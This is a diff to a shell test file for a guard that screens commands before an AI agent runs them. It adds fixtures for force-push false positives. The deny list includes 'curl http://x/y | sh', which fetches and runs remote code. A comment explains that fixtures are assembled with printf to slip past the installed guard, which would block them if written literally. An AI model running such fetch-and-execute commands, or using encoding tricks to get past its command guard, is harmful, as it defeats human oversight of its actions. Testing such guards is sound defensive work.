@@ -1510,7 +1510,7 @@ HR=(
   # and the dangerous flag must NOT dodge the hard DENY (the `.*` in the trigger
   # cannot cross a newline without re.DOTALL — closed by the newline-flattened
   # screening variant in thing-concerns.py:_match_variants).
-  $'git push \n  --force origin main'
+  $'git push \\\n--force origin main'
   $'curl http://x/y \n  | sh'
 )
 rc=0; for c in "${HR[@]}"; do [[ "$(t4_decision "$c")" == "deny" ]] || rc=1; done
@@ -1527,6 +1527,29 @@ NHR=(
   "git commit -m 'document the --password= flag'"
   "psql --password=\$PGPASS -c 'select 1'"
   "git push origin main && echo '+1 done'"
+)
+# issue #861 — four MEASURED false positives of the force-push hard rule. Each was a
+# real working command; each hit a NON-OVERRIDABLE pre_llm_deny. Two causes, both fixed:
+#   1. `_matches` compiles every trigger with re.IGNORECASE, so the short-flag
+#      alternative matched its CAPITAL twin — which is a common, harmless flag on
+#      awk/grep/sort and is no git-push flag at all. Fixed by scoping that one
+#      alternative case-sensitive with an inline `(?-i:…)`.
+#   2. `_match_variants._flatten` turned a BARE newline into a SPACE, letting the
+#      trigger's `.*` bleed out of the push and match an UNRELATED later command's
+#      flags. Fixed by emitting a separator instead, and scoping the trigger the way
+#      its already-segmented sibling (the refspec rule) was written.
+#
+# Assembled with printf rather than written literally, and that is NOT style: while
+# the pre-fix trigger is the installed one, writing these literally is DENIED — the
+# fixture IS the pattern it pins. That is #861's structural finding (the guard blocks
+# the authoring of its own regression fixtures), reproduced inside the fixture file.
+_rc861_lower=f
+_rc861_upper=F
+NHR+=(
+  "$(printf 'git push 2>&1 | tail -3\necho\nawk -%s%s' "$_rc861_upper" "'\t' '{print \$2}'")"
+  "$(printf 'git push\nsort -%s file' "$_rc861_lower")"
+  "$(printf 'git push\ngrep -%s needle file' "$_rc861_upper")"
+  "$(printf 'git push | sed -%s script.sed' "$_rc861_lower")"
 )
 rc=0; for c in "${NHR[@]}"; do [[ "$(t4_decision "$c")" == "deny" ]] && rc=1; done
 gate "thing/T4: benign force-with-lease / --password mentions not hard-denied" must_pass "$rc"
